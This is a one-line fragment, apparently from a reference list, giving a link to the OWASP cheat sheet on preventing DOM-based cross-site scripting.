- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
